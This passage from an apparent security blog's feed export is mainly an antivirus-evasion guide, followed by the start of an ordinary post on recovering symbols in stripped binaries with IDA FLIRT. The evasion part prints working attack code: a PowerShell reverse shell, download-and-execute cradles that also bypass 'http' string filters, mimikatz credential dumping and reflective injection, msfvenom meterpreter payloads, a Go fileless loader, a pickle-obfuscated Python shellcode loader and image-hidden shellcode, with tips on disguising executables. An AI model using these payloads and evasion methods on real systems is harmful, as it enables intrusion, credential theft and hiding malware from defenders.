class="number">2</span>.ps1.</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>After that the <code>2.ps1</code> is anti-AV.</p>
<p>Normally we get <code>powershell</code> reverse shell by </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object Net.Sockets.TCPClient(&#x27;x.x.x.x&#x27;,xxxx);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream(); [byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;; <span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span>=(iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendata</span> =<span class="variable">$sendback</span>+&#x27;PS &gt;&#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendata</span>);<span class="variable">$leng</span>=<span class="variable">$sendbyte</span>.Length;<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$leng</span>);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>
<p>Listen at x.x.x.x with port xxxx will get a <code>powershell</code> which is powerful and more difficult to be monitored than <code>cmd</code></p>
<ul>
<li><a class="link"   href="https://github.com/the-xentropy/xencrypt#xencrypt" >Xencrypt - PowerShell crypter v 1.0<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>From the <a class="link"   href="https://github.com/the-xentropy/xencrypt/blob/master/README.md" >README.md<i class="fas fa-external-link-alt"></i></a> it encrypts <code>mimikatz</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">Import-Module</span> ./xencrypt.ps1</span><br><span class="line">&gt; <span class="built_in">Invoke-Xencrypt</span> <span class="literal">-InFile</span> <span class="built_in">invoke-mimikatz</span>.ps1 <span class="literal">-OutFile</span> xenmimi.ps1</span><br></pre></td></tr></table></figure>
<p>You will now have an encrypted xenmimi.ps1 file in your current working directory. You can use it in the same way as you would the original script, so in this case:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">Import-Module</span> ./xenmimi.ps1</span><br><span class="line">&gt; <span class="built_in">Invoke-Mimikatz</span></span><br></pre></td></tr></table></figure>

<p>It also supports recursive layering via the -Iterations flag.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">Invoke-Xencrypt</span> <span class="literal">-InFile</span> <span class="built_in">invoke-mimikatz</span>.ps1 <span class="literal">-OutFile</span> xenmimi.ps1 <span class="literal">-Iterations</span> <span class="number">100</span></span><br></pre></td></tr></table></figure>

<p>Warning though, the files can get big and generating the output file can take a very long time depending on the scripts and number of iterations requested.</p>
<ul>
<li>Other Ways</li>
</ul>
<p>still <code>mimikatz</code> as an example</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell <span class="literal">-exec</span> bypass <span class="string">&quot;import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz  -DumpCreds&quot;</span></span><br></pre></td></tr></table></figure>
<p>To be living off the land</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell <span class="string">&quot;IEX (New-ObjectNet.WebClient).DownloadString(&#x27;http://x.x.x.x/xxx&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span></span><br></pre></td></tr></table></figure>
<p>Pass filters of string “http”</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell <span class="string">&quot;IEX (New-ObjectNet.WebClient).DownloadString((&#x27;htAtp://x.x.x.x/xxx&#x27; -replace &#x27;A&#x27;,&#x27;&#x27;));Invoke-Mimikatz -DumpCreds&quot;</span></span><br></pre></td></tr></table></figure>
<p>Not only <code>powershell</code> scripts, we can load <code>exe</code> into memory for execution using <a class="link"   href="https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" >Invoke-ReflectivePEInjection<i class="fas fa-external-link-alt"></i></a> in <a class="link"   href="https://github.com/PowerShellMafia/PowerSploit" >PowerSploit (nolonger supported)<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell.exe <span class="literal">-exec</span> bypass <span class="built_in">IEX</span> (<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString((<span class="string">&#x27;htBtp://x.x.x.x/xxx&#x27;</span> <span class="operator">-replace</span><span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));<span class="built_in">Invoke-ReflectivePEInjection</span> <span class="literal">-PEUrl</span> http://x.x.x.x/mimikatz.exe <span class="literal">-ExeArgs</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="literal">-ForceASLR</span></span><br></pre></td></tr></table></figure>



<h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><blockquote>
<p>Go is an open source programming language that makes it easy to build simple, reliable, and efficient software.</p>
</blockquote>
<p>The <code>Go</code> programing language (<code>golang</code>) was published by <code>Google</code> in 2009, having great performance like <code>C</code>&#x2F;<code>C++</code> and garbage collection (GC) like <code>Java</code>, but without dependence on vm.</p>
<p>However the <code>Go</code> binaries are always not so small, with a statically linked <code>runtime</code> library, and maybe that’s why most antivirus engines on the market have relatively weak detection capabilities for them.</p>
<ul>
<li>Main Idea</li>
</ul>
<p>Since <code>Go</code> binary for now can bypass some AV softwares directly, we can inject a <code>ELF</code> shellcode in and let binary load it when running (aka. <code>Fileless</code> or <code>Living off the Land</code>).</p>
<p>Here are some tools: </p>
<ul>
<li><a class="link"   href="https://github.com/gobuffalo/packr" >https://github.com/gobuffalo/packr<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/rakyll/statik" >https://github.com/rakyll/statik<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/GeertJohan/go.rice" >https://github.com/GeertJohan/go.rice<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/UnnoTed/fileb0x" >https://github.com/UnnoTed/fileb0x<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/mjibson/esc" >https://github.com/mjibson/esc<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/kevinburke/go-bindata" >https://github.com/kevinburke/go-bindata<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/lu4p/binclude" >https://github.com/lu4p/binclude<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/omeid/go-resources" >https://github.com/omeid/go-resources<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/pyros2097/go-embed" >https://github.com/pyros2097/go-embed<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/wlbr/mule" >https://github.com/wlbr/mule<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/miscing/embed" >https://github.com/miscing/embed<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/kyioptr/gassets" >https://github.com/kyioptr/gassets<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<hr>
<p>Here is an example.<br>We give <a class="link"   href="https://github.com/kevinburke/go-bindata" >https://github.com/kevinburke/go-bindata<i class="fas fa-external-link-alt"></i></a> a try.<br>First generate a backdoor:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ msfvenom -p  linux/x64/meterpreter/reverse_tcp  -e x86/shikata_ga_nai -i 1 lhost=x.x.x.x lport=xxxx -f elf &gt; ./test</span><br></pre></td></tr></table></figure>
<p>And we get result:<br><img src="/imghost/bav/1.png" alt="linux-before"><br>As this is <code>Linux</code> platform and has been encoded, so we get this number. Anyway we use <code>golang</code> to pack:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://github.com/kevinburke/go-bindata</span><br><span class="line">$ ./go-bindata ./test</span><br></pre></td></tr></table></figure>
<p>Here we’ll get a <code>bindata.go</code> in which stores data of <code>./test</code>, and now we should write a <code>main()</code> to load <code>test</code> data into memory and execute:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">const</span></span> (</span><br><span class="line">    mfdCloexec  = <span class="number">0x0001</span> <span class="comment">// only kernel newer than 3.17 supports</span></span><br><span class="line">    memfdCreate = <span class="number">319</span></span><br><span class="line">)</span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    data, err := <span class="built_in">Asset</span>(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        <span class="comment">// Asset was not found.</span></span><br><span class="line">        fmt.<span class="built_in">Println</span>(<span class="string">&quot;read test file content error!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    filename := <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    fd, _, _ := syscall.<span class="built_in">Syscall</span>(memfdCreate, <span class="built_in">uintptr</span>(unsafe.<span class="built_in">Pointer</span>(&amp;filename)), <span class="built_in">uintptr</span>(mfdCloexec), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    _, _ = syscall.<span class="built_in">Write</span>(<span class="built_in"><span class="keyword">int</span></span>(fd), data)</span><br><span class="line">    displayName := <span class="string">&quot;/bin/bash&quot;</span></span><br><span class="line"></span><br><span class="line">    fdPath := fmt.<span class="built_in">Sprintf</span>(<span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd)</span><br><span class="line">    _ = syscall.<span class="built_in">Exec</span>(fdPath, []string&#123;displayName&#125;, nil)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The result:<br><img src="/imghost/bav/2.png" alt="linux-after"><br>And the Windows platform, before:<br><img src="/imghost/bav/3.png" alt="win-before"><br>After:<br><img src="/imghost/bav/4.png" alt="win-after"><br>This testing project is on <a class="link"   href="https://github.com/wonderkun/go-packer" >github<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>Like <code>Golang</code> part, converting a <code>PHP</code> reverse shell to a <code>exe</code> can also lower detection rate.</p>
<p>The <a class="link"   href="https://sourceforge.net/projects/bamcompile/files/latest/download" >Bambalam PHP EXE Compiler<i class="fas fa-external-link-alt"></i></a> is like <code>pyinstaller</code>, packing <code>PHP</code> script to <code>exe</code>.</p>
<p>Generate php reverse shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ msfvenom -p php/meterpreter_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
<p>Use Bambalam PHP EXE Compiler to process the file</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ bamcompile.exe -w  -c shell.php shell.exe</span><br></pre></td></tr></table></figure>

<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p><code>Python</code> is also used as a loader, always utilize <code>ctypes</code> to call <code>C</code> functions and <code>base64</code> to do obfuscation.</p>
<p>In <code>Python</code> some functions like <code>exec()</code>, <code>eval()</code>, <code>os.system()</code> and <code>subprocess.Popen()</code> are noticed always with a glance, to hind the execution we choose deserialization.</p>
<p>Example of <code>Python</code> deserialization:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gugu</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;calc.exe&#x27;</span>,),))</span><br><span class="line"></span><br><span class="line">ret = cPickle.dumps(gugu())</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">repr</span>(ret)</span><br><span class="line">cPickle.loads(ret)</span><br></pre></td></tr></table></figure>
<p>Magic method <code>__reduce__</code> is called when an object is <code>Pickled</code>, and what it returns will be executed.<br><code>os.system()</code>, <code>subprocess.Popen()</code> and <code>eval()</code> can be choosed but, only the last <code>eval()</code>  gets rid of popping black window. However <code>eval()</code> can just run single lines.</p>
<p>Anyway here is how to generate a <code>Python</code> shellcode loader (<code>Python2</code> version):</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,cPickle,base64,urllib2</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;urllib2.urlopen(&#x27;http://x.x.x.x/xxx&#x27;).read().decode(&#x27;hex&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, shellcode</span>):</span></span><br><span class="line">            self.shellcode = shellcode</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.VirtualAlloc(0,len(shellcode),0x1000,0x40)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rwxpage, shellcode</span>):</span></span><br><span class="line">            self.rwxpage = rwxpage</span><br><span class="line">            self.shellcode = shellcode</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.RtlMoveMemory(rwxpage,ctypes.create_string_buffer(shellcode),len(shellcode))&quot;</span>,))</span><br><span class="line">       </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test4</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rwxpage</span>):</span></span><br><span class="line">            self.rwxpage = rwxpage</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.CreateThread(0,0,rwxpage,0,0,0)&quot;</span>,))</span><br><span class="line">            </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test5</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, handle</span>):</span></span><br><span class="line">            self.handle = handle</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.WaitForSingleObject(handle,-1)&quot;</span>,))</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    raw_shellcode = test1()</span><br><span class="line">    ser_shellcode = cPickle.dumps(raw_shellcode)</span><br><span class="line">    enb32_shellcode = base64.b32encode(ser_shellcode)</span><br><span class="line">    shellcode = cPickle.loads(base64.b32decode(enb32_shellcode))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_vir = test2(shellcode)</span><br><span class="line">    ser_vir = cPickle.dumps(raw_vir)</span><br><span class="line">    enb32_vir = base64.b32encode(ser_vir)</span><br><span class="line">    rwxpage = cPickle.loads(base64.b32decode(enb32_vir))</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    raw_rtl = test3(rwxpage, shellcode)</span><br><span class="line">    ser_rtl = cPickle.dumps(raw_rtl)</span><br><span class="line">    enb32_rtl = base64.b32encode(ser_rtl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_handle=test4(rwxpage)</span><br><span class="line">    ser_handle = cPickle.dumps(raw_handle)</span><br><span class="line">    enb32_handle = base64.b32encode(ser_handle)</span><br><span class="line">    handle = cPickle.loads(base64.b32decode(enb32_handle))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_run = test5(handle)</span><br><span class="line">    ser_run = cPickle.dumps(raw_run)</span><br><span class="line">    enb32_run = base64.b32encode(ser_run)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    output = <span class="string">&#x27;&#x27;&#x27;import ctypes,cPickle,base64,urllib2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_shellcode = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">shellcode = cPickle.loads(base64.b32decode(e_shellcode))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_rwxpage=&quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">rwxpage = cPickle.loads(base64.b32decode(e_rwxpage))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_code = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">cPickle.loads(base64.b32decode(e_code))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_handle = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">handle = cPickle.loads(base64.b32decode(e_handle))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_run = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">cPickle.loads(base64.b32decode(e_run))&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(enb32_shellcode, enb32_vir, enb32_rtl, enb32_handle, enb32_run)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Loader.py&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(output)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
<p>Then we get a <code>Loader.py</code> and use <code>pyinstaller</code> to pack it.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ PyInstaller --noconsole --onefile Loader.py</span><br></pre></td></tr></table></figure>

<h2 id="Shellcode-in-Picture"><a href="#Shellcode-in-Picture" class="headerlink" title="Shellcode in Picture"></a>Shellcode in Picture</h2><p>This method first divides the malware into loader and shellcode, and puts shellcode in a picture.</p>
<p>Proj1: <a class="link"   href="https://github.com/Hangingsword/HouQing" >Hou Qing<i class="fas fa-external-link-alt"></i></a></p>
<ul>
<li>Change the <code>KEY_1</code> and <code>KEY_2</code> in <code>code.go</code> and <code>Loader.go</code>.</li>
<li>Set up a listener, and write payload in <code>code.go</code> (can use java listener to get byte-shellcode).</li>
<li>Run <code>code.go</code>: <code>go run code.go xxx.png</code> and upload png to a website(image should not be compressed).</li>
<li>write image url in <code>Loader.go</code>.</li>
<li>run <code>Loader.go</code>: <code>go run Loader.go</code> to get online.</li>
<li>Compile it as EXE: <code>go build -ldflags=&quot;-H windowsgui&quot; Loader.go</code> and use SFX, RLO, or so, to disguise.</li>
</ul>
<p>Proj2: <a class="link"   href="https://github.com/peewpw/Invoke-PSImage" >Invoke-PSImage<i class="fas fa-external-link-alt"></i></a></p>
<ul>
<li>Generate payload.ps1 by MSF&#x2F;CS and put it in <code>Invoke-PSImage</code> folder</li>
<li>Generate shell.png:<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-PSimage</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-PSImage</span> <span class="literal">-Script</span> .\payload.ps1 <span class="literal">-Image</span> .\origin.jpg <span class="literal">-Out</span> .\shell.png <span class="literal">-Web</span></span><br></pre></td></tr></table></figure></li>
<li>Get a line of code to invoke the shell:<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://example.com/shell.png&quot;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">2560</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3550</span>]))</span><br></pre></td></tr></table></figure></li>
<li>Loader-Shellcode structure is also recommended. You can compile the powershell above to a PE file, and use SFX, RLO, …</li>
</ul>
<h2 id="Addition"><a href="#Addition" class="headerlink" title="Addition"></a>Addition</h2><p>Bypass tools:</p>
<ul>
<li><a class="link"   href="https://github.com/Hzllaga/ShellcodeLoader" >ShellcodeLoader<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/1y0n/AV_Evasion_Tool" >AV_Evasion_Tool<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/TideSec/BypassAntiVirus" >BypassAntiVirus<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/admin360bug/bypass" >bypass<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/hack2fun/BypassAV/blob/master/bypass.cna" >BypassAV<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/Bl4ckM1rror/FUD-UUID-Shellcode" >FUD-UUID-Shellcode<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/knownsec/shellcodeloader" >ShellcodeLoader knownsec<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/Axx8/ShellCode_Loader" >ShellCode_Loader Axx8<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/Axx8/Bypass_AV" >Bypass_AV Axx8<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/awsaaaq/GoBP" >GoBP<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/sh3d0ww01f/nim_shellloader" >nim_shellloader<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/ORCx41/TerraLdr" >TerraLdr<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Online resources:</p>
<ul>
<li><a class="link"   href="https://unprotect.it/" >UnprotectProject - Search Evasion Techniques<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://lolbas-project.github.io/" >Living Off The Land Binaries, Scripts and Libraries<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://hijacklibs.net/" >Hijack Libs<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://bypass.tidesec.com/" >TideBypass<i class="fas fa-external-link-alt"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>Binary SCA (Software Composition Analysis) Related Tools</title>
    <url>/2023/01/02/2023-01-02-Binary-SCA-Software-Composition-Analysis-Related-Tools/</url>
    <content><![CDATA[<p>Software Composition Analysis (SCA) for binary helps a lot for vulnerability discovery and program analysis, related fields include: stripped binary symbols recovery, and open-source components detection.</p>
<h2 id="Recover-Symbols-for-Stripped-Binaries"><a href="#Recover-Symbols-for-Stripped-Binaries" class="headerlink" title="Recover Symbols for Stripped Binaries"></a>Recover Symbols for Stripped Binaries</h2><p>Stripping symbols is a good way to reduce size of binaries, and to hide program information.</p>
<p>Use <code>strip</code> or <code>sstrip</code> in <a class="link"   href="http://www.muppetlabs.com/~breadbox/software/elfkickers.html" >Kickers of ELF<i class="fas fa-external-link-alt"></i></a> to remove symbols and sections.</p>
<p>But for program analysts, recovering binary symbols helps a lot.</p>
<h3 id="IDA-Pro-FLIRT"><a href="#IDA-Pro-FLIRT" class="headerlink" title="IDA Pro FLIRT"></a>IDA Pro FLIRT</h3><p>The traditional technique <code>FLIRT</code> (Fast Library Identification and Recognition Technology) using signatures to match binary functions if they are stripped library functions linked statically.</p>
<h4 id="Prepare-Sig-Files"><a href="#Prepare-Sig-Files" class="headerlink" title="Prepare Sig Files"></a>Prepare Sig Files</h4><p>In <code>/path/to/IDA/ida_plugin/</code> there is a <code>flair70.zip</code> (for IDA 7.0 version, backup <a href="/filehost/bsrt/flair70.zip">here</a>), unzip for binaries we want to use (e.g. in linux), and remember to give them executable permission:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/path/to/flair70/bin/linux</span><br><span class="line">$ ls</span><br><span class="line">dumpsig  pcf  pelf  pelf.rtb  plb  pmacho  pomf166  ppsx  ptmobj  sigmake  zipsig</span><br><span class="line">$ chmod +x pelf sigmake </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>To prepare signature database, first choose materials (compiled archived libraries, like <code>libc.a</code>), then use <code>pelf</code>(it’s for linux <code>ELF</code> format, <code>pcf</code> for windows <code>COFF</code> format) and <code>sigmake</code> to generate <code>sig</code> file:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># choose one small lib as an example, not *.so but *.a format </span></span><br><span class="line">$ file /lib/libsupp.a   </span><br><span class="line">/lib/libsupp.a: current ar archive</span><br><span class="line"><span class="comment"># copy to flair bins&#x27; dir</span></span><br><span class="line">$ cp /lib/libsupp.a /path/to/flair70/bin/linux</span><br><span class="line">$ <span class="built_in">cd</span> /path/to/flair70/bin/linux</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate pattern (intermediate) file</span></span><br><span class="line">$ ./pelf libsupp.a libsupp.pat</span><br><span class="line">/path/to/flair70/bin/linux/libsupp.a: skipped 0, total 1    </span><br><span class="line"><span class="comment"># it goes smoothly, while sometimes goes wrong:</span></span><br><span class="line">$  ./pelf libcurl.a libcurl.ptn</span><br><span class="line">Fatal [libcurl.a] (libcurl_la-file.o): Unknown relocation <span class="built_in">type</span> 42 (offset <span class="keyword">in</span> section=0x14).     </span><br><span class="line"><span class="comment"># to deal with it, : -rN:O:L     support relocation type N (mark as variable L bytes at offset O from the relocation address). can be specified multiple times</span></span><br><span class="line">$  ./pelf -r42:0:0 libcurl.a libcurl.ptn</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate signature file</span></span><br><span class="line">$ ./sigmake libsupp.pat libsupp.sig</span><br><span class="line"><span class="comment"># still smoothly, while not always when meeting big libraries:</span></span><br><span class="line">$  ./sigmake libboost_thread.ptn libboost_thread-1.63.sig</span><br><span class="line">libboost_thread-1.63.sig: modules/leaves: 95/146, COLLISIONS: 4</span><br><span class="line"><span class="comment"># when collisions occur, edit XXX.exc and make again</span></span><br><span class="line">$ vim libboost_thread.exc</span><br><span class="line">...</span><br><span class="line">$  ./sigmake libboost_thread.ptn libboost_thread-1.63.sig</span><br><span class="line"></span><br><span class="line"><span class="comment"># finally copy `sig` files to `/path/to/IDA/sig/pc` </span></span><br><span class="line"><span class="comment"># (`pc` or `arm` or `ppc` or `mips` at the tail indicates ISA)</span></span><br><span class="line">$ cp *.sig /path/to/IDA/sig/pc</span><br></pre></td></tr></table></figure>

<p>There are databases for matching already: </p>
<ul>
<li><a class="link"   href="https://github.com/Maktm/FLIRTDB" >FLIRT Signature File Database<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/push0ebp/sig-database" >sig-database<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><p><code>shift</code> + <code>F5</code> and right button to choose <code>Apply new signature</code>,<br><img src="/imghost/bsrt/shift+f5.png" alt="shift + f5"><br><img src="/imghost/bsrt/sigs-win.png" alt="sig list"></p>
